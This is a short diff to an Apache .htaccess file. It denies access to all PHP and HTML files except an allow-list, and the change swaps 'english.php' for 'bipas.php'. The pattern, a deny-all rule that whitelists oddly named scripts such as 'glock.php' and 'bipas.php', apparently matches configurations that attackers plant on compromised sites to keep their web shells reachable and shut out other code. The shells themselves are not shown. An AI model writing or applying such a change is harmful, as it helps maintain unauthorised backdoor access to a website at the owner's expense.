@@ -1,7 +1,7 @@
 <FilesMatch "\.(php|ph*|Ph*|PH*|pH*|shtml|phtml|htm*|PHTML|SHTML)$">
     Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|glock.php|error_clear_last.php|config.php|english.php)$">
+<FilesMatch "^(index.php|glock.php|error_clear_last.php|config.php|bipas.php)$">
     Allow from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
